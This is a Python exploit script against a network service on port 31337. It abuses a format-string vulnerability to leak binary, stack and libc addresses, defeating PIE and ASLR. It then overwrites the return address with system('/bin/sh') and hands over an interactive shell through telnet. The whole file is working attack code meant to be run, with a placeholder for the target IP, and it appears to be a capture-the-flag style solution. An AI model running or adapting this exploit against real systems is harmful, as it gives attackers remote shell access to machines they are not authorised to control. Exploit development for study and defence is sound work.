from struct import pack, unpack
from telnetlib import Telnet
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
target = ("localhost", 31337) # Replace localhost with IP of target.
libc_found = True # Change between True and False depending on if libc version is found. If libc version is found, add printflibc_offset to offset variables below.
p32 = lambda x : pack("<I",x)
u32 = lambda x : unpack("<I",x)[0]  # Used to pack and unpack addresses for sending and receiving addresses.

bin_offset = 0x637
stack_offset = 0x4
putsgot_offset = 0x1fd8
fflushgot_offset = 0x1fd0
fgetsgot_offset = 0x1fd4
printfgot_offset = 0x1fcc
printflibc_offset = 0x512d0
systemlibc_offset = 0x3d200
binshlibc_offset = 0x17e0cf
exitlibc_offset = 0x303d0

def find_bin_base(bin_offset): # Finds the base address of the program in memory (to bypass PIE).
    s.send("%3$x" + '\n')
    bin_leak = int(s.recv(1024)[:-1], 16)
    print("[*] Leaked address: " + hex(bin_leak))
    bin_base = bin_leak - bin_offset
    print("[*] Binary base address: " + hex(bin_base))
    return bin_base

def calc_got(*argv): # Calculates the GOT addresses of different libc functions.
    printfgot_addr = bin_base + printfgot_offset
    print("[*] printf@got address: " + hex(printfgot_addr))
    if len(argv) == 2:
        return printfgot_addr
    putsgot_addr = bin_base + putsgot_offset
    print("[*] puts@got address: " + hex(putsgot_addr))
    fflushgot_addr = bin_base + fflushgot_offset
    print("[*] fflush@got address: " + hex(fflushgot_addr))
    fgetsgot_addr = bin_base + fgetsgot_offset
    print("[*] fgets@got address: " + hex(fgetsgot_addr))
    return putsgot_addr, fflushgot_addr, fgetsgot_addr, printfgot_addr

def leak_libc(*argv): # Leaks the libc addresses of different functions.
    payload = p32(printfgot_addr)
    payload += b"%7$s"
    s.send(payload + '\n')
    printf = s.recv(1024)
    printf = u32(printf[4:8])
    print("[*] printf@libc address: " + hex(printf))
    if len(argv) == 1:
        return printf
    payload = p32(putsgot_addr)
    payload += b"%7$s"
    s.send(payload + '\n')
    puts = s.recv(1024)
    puts = u32(puts[4:8])
    print("[*] puts@libc address: " + hex(puts))
    payload = p32(fflushgot_addr)
    payload += b"%7$s"
    s.send(payload + '\n')
    fflush = s.recv(1024)
    fflush = u32(fflush[4:8])
    print("[*] fflush@libc address: " + hex(fflush))
    payload = p32(fgetsgot_addr)
    payload += b"%7$s"
    s.send(payload + '\n')
    fgets = s.recv(1024)
    fgets = u32(fgets[4:8])
    print("[*] fgets@libc address: " + hex(fgets))
    payload = p32(printfgot_addr)
    payload += b"%7$s"
    s.send(payload + '\n')
    printf = s.recv(1024)
    printf = u32(printf[4:8])
    print("[*] printf@libc address: " + hex(printf))

def calc_libc(printf, printf_offset): # Calculates the libc addresses of the system function, the '/bin/sh' string, and the address of the exit function.
    libc_base = printf - printflibc_offset
    print("[*] libc base address: " + hex(libc_base))
    system = libc_base + systemlibc_offset
    print("[*] system address: " + hex(system))
    binsh = libc_base + binshlibc_offset
    print("[*] binsh address: " + hex(binsh))
    exit = libc_base + exitlibc_offset
    print("[*] exit address: " + hex(exit))
    return system, binsh, exit

def leak_stack(stack_offset): # Leaks the stack addresses that we need to overwrite.
    s.send("%72$x" + '\n')
    stack_leak = int(s.recv(1024)[:-1], 16)
    print("[*] Leaked stack address: " + hex(stack_leak))
    eip_addr = stack_leak - stack_offset
    print("[*] EIP address: " + hex(eip_addr))
    arg_addr = stack_leak + stack_offset
    print("[*] Argument address: " + hex(arg_addr))
    return eip_addr, arg_addr, stack_leak

def address_format(address): # Calculates the number of bytes that need to be written to write the addresses.
    firsthalfhex = hex(address)[6:]
    firsthalf = int("0x" + firsthalfhex, 0)
    firsthalf -= 8
    if len(str(firsthalf)) == 4:
        firsthalf = "0" + str(firsthalf)
    secondhalfhex = hex(address)[:6]
    firsthalfhex = int("0x" + firsthalfhex, 16)
    secondhalf = int(secondhalfhex, 16) - firsthalfhex
    if len(str(secondhalf)) == 4:
        secondhalf = "0" + str(secondhalf)
    return (firsthalf, secondhalf)

def write_address(function, address): # Writes a value to an address.
    firsthalf, secondhalf = address_format(function)
    payload = p32(address)
    payload += p32(address + 2)
    payload += b"%" + str.encode(str(firsthalf)) + b"x%7$hn"
    payload += b"%" + str.encode(str(secondhalf)) + b"x%8$hn"
    s.send(payload + '\n')

s.connect(target)
s.recv(1024)
if libc_found: # Finds necessary addresses, executes a shell, and interacts with the service.
    bin_base = find_bin_base(bin_offset)
    printfgot_addr = calc_got(bin_base, printfgot_offset)
    printf = leak_libc(printfgot_addr)
    system, binsh, exit = calc_libc(printf, printflibc_offset)
    eip_addr, arg_addr, exit_addr = leak_stack(stack_offset)
    write_address(system, eip_addr)
    write_address(binsh, arg_addr)
    write_address(exit, exit_addr)
    s.send(" " * 256 + '\n')
    t=Telnet()
    t.sock=s
    t.interact()
else: # Only calculates libc addresses so libc version can be found manually.
    bin_base = find_bin_base(bin_offset)
    putsgot_addr, fflushgot_addr, fgetsgot_addr, printfgot_addr = calc_got(bin_base, putsgot_offset, fflushgot_offset, fgetsgot_offset, printfgot_offset)
    leak_libc(putsgot_addr, fflushgot_addr, fgetsgot_addr, printfgot_addr)
    print("[*] Using these values, find the libc version at libc.blukat.me")
